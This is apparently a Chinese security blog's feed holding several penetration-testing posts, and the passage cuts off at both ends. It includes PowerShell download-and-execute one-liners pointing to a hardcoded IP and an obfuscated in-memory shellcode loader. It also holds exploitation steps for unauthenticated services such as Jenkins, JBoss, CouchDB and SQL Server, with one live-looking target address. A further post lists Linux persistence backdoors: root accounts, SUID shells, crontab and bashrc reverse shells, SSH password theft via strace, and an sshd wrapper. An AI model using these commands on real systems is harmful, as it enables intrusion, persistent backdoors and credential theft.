class="hljs-string">Net</span>.<span class="hljs-string">WebClient</span>).<span class="hljs-string">DownloadString</span>(<span class="hljs-string">&#x27;http://170.170.64.17:8000/calc.ps1&#x27;</span>)<br><br><span class="hljs-string">powershell</span> <span class="hljs-built_in">set-alias</span> -<span class="hljs-string">name</span> <span class="hljs-string">xxx</span> -<span class="hljs-string">value</span> <span class="hljs-string">Invoke-Expression</span>;<span class="hljs-string">xxx</span>(<span class="hljs-string">New-Object</span> <span class="hljs-string">Net</span>.<span class="hljs-string">WebClient</span>).<span class="hljs-string">DownloadString</span>(<span class="hljs-string">&#x27;http://170.170.64.17:8000/test.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="目标不出网"><a href="#目标不出网" class="headerlink" title="目标不出网"></a>目标不出网</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># readbytes.ps1</span><br><br>[<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$bytes</span> = [<span class="hljs-type">System.IO.File</span>]::ReadAllBytes(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>])<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$bytes</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$s</span> += <span class="hljs-variable">$bytes</span>[<span class="hljs-variable">$x</span>]<br>        <span class="hljs-variable">$s</span> += <span class="hljs-string">&quot;,&quot;</span><br>&#125;<br><br><span class="hljs-variable">$s</span><br><br><span class="hljs-comment"># 从bin文件中读取字节数组，并替换文中的字节数组</span><br>readbytes.ps1 .\payload.bin<br><br><br><br>powershell <span class="hljs-variable">$string</span>=&#123;<span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address</span></span> &#123;<span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>);<span class="hljs-variable">$var_unsafe_native_methods</span> = ([<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies() ^| <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>);<span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>));<span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type</span></span> &#123;<span class="hljs-keyword">Param</span> ([<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]);<span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>]);<span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>);<span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Invoke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()&#125;;<span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;[<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$var_code</span> =<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">26</span>;&#125;;<span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])));<span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$var_code</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40);[<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$var_code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$var_code</span>.length);<span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])));<span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)&#125;&#125;.ToString();<span class="hljs-built_in">iex</span> <span class="hljs-variable">$string</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>powershell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见未授权访问漏洞总结</title>
    <link href="/2021/01/10/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/10/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。本文对常见的未授权访问利用所需的工具和命令做总结。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell</p><p>工具：Navicat</p><h2 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h2><p>1433端口未授权访问，可读取数据库内容，可尝试执行master..cmdshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.xp..cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-built_in">exec</span> master..cmdshell <span class="hljs-string">&#x27;dir c:\&#x27;</span><br></code></pre></td></tr></table></figure><p>工具：Navicat</p><h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>27017端口未授权访问，可读取数据库内容</p><p>工具：Navicat，Robo3T</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>27017端口未授权访问，可读取数据库内容</p><p>可通过四种方式getshell：写webshell、写crontabs、写ssh公钥、Redis主从复制(4.x,5.x)</p><p>工具：Redis-cli,fofa:protocol=redis</p><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><p>Hadoop webUI界面未授权访问，如果存在New Application API功能，可尝试getshell</p><p>工具：浏览器，<a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p><h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>9200端口未授权访问，可非法操作数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">9200</span><span class="hljs-regexp">/_plugin/</span>head/  web管理界面<br>http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">9200</span><span class="hljs-regexp">/_cat/i</span>ndices  查看集群当前状态<br>http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">9200</span>/_nodes  查看节点数据<br>http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">9200</span><span class="hljs-regexp">/_river/</span>_search  查看数据库敏感信息<br></code></pre></td></tr></table></figure><p>工具：浏览器</p><h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>2181，2182端口未授权访问，可读取敏感信息，或者在Zookeeper集群内执行kill命令</p><p>工具：netcat，<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p><h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><p>SpringBoot，web中env路径配置文件未授权访问，可暴露大量联动设备密码信息</p><p>工具：浏览器</p><h2 id="ds-store"><a href="#ds-store" class="headerlink" title="ds_store"></a>ds_store</h2><p><a href="http://ip/.ds_store%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E9%80%9A%E8%BF%87github%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDweb%E7%9B%AE%E5%BD%95">http://ip/.ds_store未授权访问，可通过github工具下载web目录</a></p><p>工具：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>vnc用于远程桌面控制，默认端口在5900-5905之间，此类端口未授权访问会导致恶意用户直接控制受控主机</p><p>工具：VNCview</p><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>docker的2375端口web未授权访问，可通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</p><p>工具：浏览器</p><h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>Jenkins面板<a href="http://ip:8080/manage">http://ip:8080/manage</a><br>未授权访问会允许用户选择执行脚本界面，操作一些系统层命令</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">println &quot;whoami&quot;.execute().text 命令执行</span><br><span class="xml">new File (&quot;/var/www/html/shell.php&quot;).write(&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;); 写webshell</span><br></code></pre></td></tr></table></figure><p>工具：浏览器</p><h2 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h2><p>Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">telnet ip <span class="hljs-number">11211</span> 或 nc -vv &lt;<span class="hljs-keyword">target</span>&gt; <span class="hljs-number">11211</span><br>无需用户名密码，可以直接连接memcache服务的<span class="hljs-number">11211</span>端口<br>stats <span class="hljs-comment">#查看memcache服务状态</span><br></code></pre></td></tr></table></figure><p>工具：netcat，telnet</p><h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>JBOSS的webUI界面<a href="http://ip:8080/jmx-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE(%E6%88%96%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81admin/admin)%EF%BC%8C%E5%8F%AF%E5%AF%BC%E8%87%B4JBoss%E7%9A%84%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E8%8E%B7%E5%8F%96webshell">http://ip:8080/jmx-console未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">点击JMX CONSOLE未授权访问<br>点击jboss.deployment中的deploymentScanner进入应用部署页面<br>使用apache搭建远程木马服务器shell.war<br>addurl-java.lang.String配置访问木马地址http:<span class="hljs-regexp">//</span>&lt;ip&gt;/shell.war<br>访问http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">8080</span><span class="hljs-regexp">/shell/</span><br></code></pre></td></tr></table></figure><p><a href="http://221.229.247.184:8080/jmx-console/">http://221.229.247.184:8080/jmx-console/</a></p><p>工具：浏览器，fofa：”JBoss Management”</p><h2 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h2><p>.svn目录未授权访问，可能导致大量源码泄露</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">svn-extractor</span>.<span class="hljs-string">py</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;url with .svn available&quot;</span><br></code></pre></td></tr></table></figure><p>工具：<a href="https://github.com/anantshri/svn-extractor">https://github.com/anantshri/svn-extractor</a></p><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>.git目录未授权访问，可能导致大量源码泄露</p><p>方法1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -r -p -np -k http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/.git/</span> <span class="hljs-comment">#先递归批量下载.git目录</span><br>git log <span class="hljs-comment">#查看网站的提交记录</span><br>git reset --hard [log hash] <span class="hljs-comment">#恢复到指定版本号</span><br></code></pre></td></tr></table></figure><p>方法2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GitHack.py http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/.git/</span><br></code></pre></td></tr></table></figure><p>工具：git,<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h2 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h2><p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">apt install nfs-common 安装nfs客户端<br>showmount -e xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> 查看nfs服务器上的共享目录<br>mount -t nfs xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span>:/grdata /mnt 挂载到本地<br>umount /mnt 卸载目录<br></code></pre></td></tr></table></figure><h2 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h2><p>CouchDB的webui未授权访问时，可通过 <a href="http://xx.xx.xx.xx:5984/_utils/">http://xx.xx.xx.xx:5984/_utils/</a> 页面创建管理员用户，并通过put方式远程代码执行（CVE-2017-12635）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl -X PUT &#x27;http://admin:admin@xx.xx.xx.xx:<span class="hljs-number">5984</span>/_config/query_servers/cmd&#x27; -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;<br>curl -X PUT &#x27;http://admin:admin@xx.xx.xx.xx:<span class="hljs-number">5984</span>/vultest&#x27;<br>curl -X PUT &#x27;http://admin:admin@xx.xx.xx.xx:<span class="hljs-number">5984</span>/vultest/vul&#x27; -d &#x27;&#123;&quot;_id&quot;:&quot;<span class="hljs-number">770895</span>a<span class="hljs-number">9772</span>6d5ca6d70a<span class="hljs-number">22173005</span>c7b&quot;&#125;&#x27;<br>curl -X POST &#x27;http://admin:admin@xx.xx.xx.xx:<span class="hljs-number">5984</span>/vultest/_temp_view?limit=10&#x27; -d &#x27;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#x27; -H &#x27;Content-Type:application/json&#x27;<br></code></pre></td></tr></table></figure><p>工具：curl，<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>未授权访问</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux后门手法总结</title>
    <link href="/2021/01/05/linux%E5%90%8E%E9%97%A8%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/05/linux%E5%90%8E%E9%97%A8%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">useradd guest;echo &#x27;guest:<span class="hljs-number">123456</span>&#x27;<span class="hljs-string">|chpasswd</span><br>echo <span class="hljs-string">&quot;guest:x:0:0::/:/bin/sh&quot;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><h2 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h2><p>将公钥放到服务器的.ssh/authorized_keys中，使用私钥登录</p><h2 id="suid-shell"><a href="#suid-shell" class="headerlink" title="suid shell"></a>suid shell</h2><p>使用root账户执行如下命令，在某个用户目录下建立一个隐藏的suid文件.233，加点为了隐藏文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/home/</span>test/.<span class="hljs-number">233</span><br>chmod <span class="hljs-number">4755</span> <span class="hljs-regexp">/home/</span>test/.<span class="hljs-number">233</span><br></code></pre></td></tr></table></figure><p>之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>test/.<span class="hljs-number">233</span> -p<br></code></pre></td></tr></table></figure><h2 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h2><p>创建ssh软连接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su; /</span>tmp/su -oPort=<span class="hljs-number">5555</span>;<br></code></pre></td></tr></table></figure><p>攻击机连接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ssh <span class="hljs-symbol">root@</span>ip:<span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h2 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h2><p>可以通过修改/etc/inetd.conf文件维持权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/i</span>netd.conf<br>添加内容<br>daytime stream tcp nowait root <span class="hljs-regexp">/bin/</span>bash bash -i<br>重启服务<br>service inetd restart<br></code></pre></td></tr></table></figure><p>攻击者使用nc连接shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -vv ip <span class="hljs-number">13</span><br></code></pre></td></tr></table></figure><h2 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h2><p>每天6点反弹shell</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">6</span> * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="修改-bash-profile-和-bashrc"><a href="#修改-bash-profile-和-bashrc" class="headerlink" title="修改/.bash_profile 和/.bashrc"></a>修改<del>/.bash_profile 和</del>/.bashrc</h2><p>此类文件在新shell打开时会自动执行，将后门程序写入这类文件可以在每次打开新shell的时候进行一个反弹shell操作</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">在文件中添加bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/xx.xx.xx.xx/</span>端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>利用strace窃取ssh密码</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">vi ~<span class="hljs-regexp">/.bashrc或者/</span>etc/bashrc<br>alias ssh=<span class="hljs-string">&#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date&#x27;</span>+%d%h%m%s<span class="hljs-string">&#x27;`.log -s 32 ssh&#x27;</span><br><span class="hljs-keyword">source</span> ~/.bashrc<br>cat <span class="hljs-regexp">/tmp/</span>.sshxxxxx | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;read(4,&quot;</span><br></code></pre></td></tr></table></figure><h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/usr/sbin/</span><br>mv sshd <span class="hljs-string">../bin/</span><br><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-comment">#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="hljs-keyword">echo</span> &#x27;exec <span class="hljs-string">&quot;/bin/sh&quot;</span> <span class="hljs-keyword">if</span><span class="hljs-params">(getpeername(STDIN)</span> =~ /^<span class="hljs-string">..4A/</span>);&#x27; &gt;&gt;sshd<br><span class="hljs-keyword">echo</span> &#x27;exec&#123;<span class="hljs-string">&quot;/usr/bin/sshd&quot;</span>&#125; <span class="hljs-string">&quot;/usr/sbin/sshd&quot;</span>,@ARGV,&#x27; &gt;&gt;sshd<br>chmod u+x sshd<br><span class="hljs-string">/etc/init.d/sshd</span> restart<br>连接：<br>socat STDIO TCP4<span class="hljs-function">:target_ip</span><span class="hljs-function">:22</span>,sourceport=13377<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据回传通道总结</title>
    <link href="/2021/01/04/%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0%E9%80%9A%E9%81%93%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/04/%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0%E9%80%9A%E9%81%93%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p><h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">python2：<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> SimpleHTTPServer<br><span class="hljs-keyword">python3</span>:<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> http.server<br>php:<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>利用ftp回传</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 